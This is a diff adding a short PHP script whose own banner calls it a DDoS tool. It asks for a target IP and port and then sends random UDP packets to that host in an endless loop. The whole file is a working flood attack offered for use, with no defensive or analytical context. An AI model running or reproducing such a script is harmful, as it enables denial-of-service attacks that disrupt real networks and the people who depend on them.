@@ -1,0 +1,18 @@
+<?php
+$sock = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
+
+echo "Script By JeanLeKhey | PhP DDoS";
+echo "\n";
+$ip = readline("IP : ");
+$port = readline("Port : ");
+$packets = random_bytes(1000);
+$len = strlen($packets);
+
+echo "----------------";
+echo "Flooding IP ==>"." ".$ip." "."Port ==>"." ".$port;
+echo "----------------";
+while(true)
+{
+ socket_sendto($sock, $packets, $len, 0, $ip , $port);
+}
+?>
